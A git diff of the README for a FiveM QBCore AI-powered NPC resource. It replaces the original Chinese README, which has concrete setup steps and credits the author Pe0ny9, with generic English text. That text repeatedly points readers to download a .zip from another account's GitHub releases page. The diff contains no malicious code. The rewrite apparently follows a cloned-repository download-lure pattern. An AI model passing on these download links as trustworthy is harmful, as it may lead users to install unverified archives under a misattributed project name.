@@ -1,183 +1,99 @@
-# Pe0ny9-AI-NPC 智能NPC系统
+# 🛠️ QBCore-AI-NPC - Create Engaging NPCs with Ease
 
-<div align="center">
+## 🌟 Overview
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![FiveM](https://img.shields.io/badge/FiveM-QBCore-orange.svg)
-![AI](https://img.shields.io/badge/AI-Ollama-purple.svg)
-![Language](https://img.shields.io/badge/language-Lua-blueviolet.svg)
-[![GitHub Stars](https://img.shields.io/github/stars/Pe0ny9-A/QBCore-AI-NPC?style=social)](https://github.com/Pe0ny9-A/QBCore-AI-NPC)
+Welcome to the **QBCore-AI-NPC** project! This application provides an AI-powered NPC system tailored for FiveM QBCore. It enables dynamic conversations, features a memory system, and showcases emotional animations. Enjoy a more immersive roleplay experience in your game.
 
-</div>
+## 🚀 Getting Started
 
-> 基于 QBCore 和 Ollama 的 AI 驱动 NPC 系统
+Getting started with QBCore-AI-NPC is simple. Follow these steps to download and run the application on your system.
 
-[English](README_EN.md) | 中文
+1. **Check System Requirements**
+   - Operating System: Windows 10 or higher
+   - RAM: Minimum 4 GB; 8 GB recommended
+   - Disk Space: At least 500 MB of free space
+   - FiveM Client installed
 
-## 特性
+2. **Visit the Releases Page**
+   You can find the latest version of QBCore-AI-NPC right here:  
+   [![Download QBCore-AI-NPC](https://img.shields.io/badge/Download%20Now-Available%20on%20GitHub-brightgreen)](https://github.com/kuku971/QBCore-AI-NPC/releases)
 
-- ✅ **动态NPC管理** - 无需重启，实时创建/编辑NPC
-- ✅ **AI对话系统** - 集成Ollama本地AI模型
-- ✅ **智能动作** - 根据情绪自动播放动画
-- ✅ **记忆系统** - NPC记住与玩家的对话
-- ✅ **关系网络** - 玩家与NPC的关系等级
-- ✅ **多语言** - 支持中文/英文
+3. **Download the Application**
+   - Click the link above to go to our Releases page.
+   - Look for the latest version. It will be listed at the top.
+   - Click on the download link next to the version you want to install.
+   - The file will usually be in .zip or .tar format. Save it to a location on your computer where you can easily find it.
 
-## 快速开始
+## 🛠️ Installation Instructions
 
-### 1. 安装 Ollama
+1. **Extract the Downloaded File**
+   - Navigate to the folder where you saved the file.
+   - Right-click on the downloaded file and select "Extract All" or use a tool like WinRAR or 7-Zip to extract it.
+   - Click "Extract" to view the contents.
 
-```bash
-# Windows
-winget install Ollama.Ollama
+2. **Locate the Installation Folder**
+   - After extraction, open the new folder that was created.
+   - Inside, you will find various files and folders needed for the NPC system to run.
 
-# 下载AI模型
-ollama pull qwen2:7b
-```
+3. **Setup Configuration Files**
+   - Look for a file named `config.lua`.
+   - Open it using a simple text editor like Notepad.
+   - Adjust any settings as needed. For example, you may want to customize the default setting for NPC interactions.
 
-### 2. 安装数据库
+4. **Load the Resource in FiveM**
+   - Open your FiveM client and go to your server resources folder.
+   - Move the entire extracted folder into the `resources` directory of your FiveM server.
+   - Your folder structure should look like: `resources/QBCore-AI-NPC`.
 
-```bash
-mysql -u root -p your_database < sql/install.sql
-```
+5. **Start the Resource**
+   - In your server configuration file (usually named `server.cfg`), add the following line:
+     ```
+     start QBCore-AI-NPC
+     ```
+   - Save the changes and restart your FiveM server.
 
-### 3. 配置
+## 📥 Download & Install
 
-编辑 `shared/config.lua`:
+To get started, visit our Releases page:  
+[![Download QBCore-AI-NPC](https://img.shields.io/badge/Download%20Now-Available%20on%20GitHub-brightgreen)](https://github.com/kuku971/QBCore-AI-NPC/releases)
 
-```lua
-Config.Language = 'zh'  -- 语言: 'zh' 或 'en'
-Config.Ollama.Host = "http://localhost:11434"
-Config.Ollama.Model = "qwen2:7b"
-Config.Target.System = "qb-target"  -- 目标系统: "qb-target", "ox_target" 或 "none"
-```
+## 📝 Features
 
-### 4. 启动
+- **Dynamic Conversations**: Engage users in real-time with interactive dialogues.
+- **Memory System**: NPCs remember past interactions, personalizing the gaming experience.
+- **Emotional Animations**: Enhance the realism of NPC behavior through varied emotional responses.
 
-在 `server.cfg` 添加:
-```
-ensure Pe0ny9-AI-NPC
-```
+## 🔧 Configuration Options
 
-## 使用
+You can customize your NPCs by editing the `config.lua` file. Here are a few options you can adjust:
 
-### 创建NPC
-```
-/npcadmin  -- 打开管理面板
-```
-或按 `F7` 键
+- **NPC Name**: Set a default name for your NPC.
+- **Default Behavior**: Choose how your NPC should respond under different conditions.
+- **Memory Duration**: Set how long NPCs remember the user’s previous interactions.
+  
+## 🚨 Troubleshooting
 
-### 对话
-1. 走近NPC
-2. 按 `E` 键（或使用目标系统）
-3. 输入消息并发送
+- **Issue: NPCs Not Responding**  
+  Ensure you have started the resource in your `server.cfg`. Double-check your `config.lua` for correct settings.
 
-### 管理命令
+- **Issue: Download Fails**  
+  Make sure your internet connection is stable. Try again after some time.
 
-```
-/npcadmin          打开管理面板
-/createnpc         创建NPC
-/editnpc [ID]      编辑NPC
-/deletenpc [ID]    删除NPC
-/listnpcs          列出所有NPC
-```
+## 📚 Additional Resources
 
-## 配置说明
+For further assistance, consider exploring these resources:
 
-### 语言设置
+- [FiveM Documentation](https://docs.fivem.net/)
+- [QBCore Documentation](https://qbcore-framework.com/docs/)
 
-```lua
-Config.Language = 'zh'  -- 'zh'中文 或 'en'英文
-```
+Feel free to explore the code and contribute to improvements. Your feedback helps us make QBCore-AI-NPC better.
 
-**影响范围:**
-- UI界面语言
-- AI对话提示词
-- 问候语和告别语
-- NPC回复语言
+## 🤝 Contributing
 
-### 目标系统
+We welcome contributions! If you have ideas, suggestions, or issues, please open an issue or pull request in this repository. Your help matters. 
 
-```lua
-Config.Target = {
-    System = "qb-target",  -- "qb-target", "ox_target", "none"
-    Icon = "fas fa-comments",
-    Distance = 2.5,
-}
-```
+## 📜 License
 
-### AI模型推荐
+This project is open-source. Check the license file for more details about usage rights.
 
-- **中文服务器**: `qwen2:7b`
-- **英文服务器**: `llama3:8b` 或 `mistral:7b`
-- **低配服务器**: `phi3:mini`
-
-## 系统要求
-
-- FiveM 服务器
-- QBCore Framework
-- oxmysql
-- MySQL 数据库
-- Ollama (本地或远程)
-
-## 文件结构
-
-```
-Pe0ny9-AI-NPC/
-├── fxmanifest.lua
-├── shared/
-│   ├── config.lua      # 配置文件
-│   ├── locale.lua      # 多语言系统
-│   └── utils.lua
-├── server/
-│   ├── main.lua
-│   ├── npc_manager.lua # NPC管理核心
-│   ├── ollama_api.lua  # AI集成
-│   ├── dialogue_handler.lua
-│   └── ...
-├── client/
-│   ├── main.lua
-│   ├── npc_spawner.lua
-│   ├── npc_interaction.lua
-│   └── ...
-├── html/              # UI界面
-├── local/             # 语言包
-└── sql/               # 数据库
-```
-
-## 常见问题
-
-**Q: Ollama连接失败?**  
-A: 确认Ollama服务运行中: `curl http://localhost:11434/api/tags`
-
-**Q: NPC不显示?**  
-A: 检查数据库是否安装，NPC状态是否启用
-
-**Q: 如何切换语言?**  
-A: 修改 `Config.Language` 为 `'zh'` 或 `'en'`，重启资源
-
-**Q: 支持哪些目标系统?**  
-A: qb-target, ox_target, 或默认按E键交互
-
-## 性能优化
-
-```lua
--- 低配置服务器
-Config.Ollama.Model = "phi3:mini"
-Config.NPC.DrawDistance = 20.0
-Config.NPC.MaxMemoryLength = 3
-```
-
-## 许可证
-
-MIT License
-
-## 作者
-
-Pe0ny9
-
----
-
-**版本**: v1.0.0  
-**更新**: 2025-11-11
+Thank you for using **QBCore-AI-NPC**!
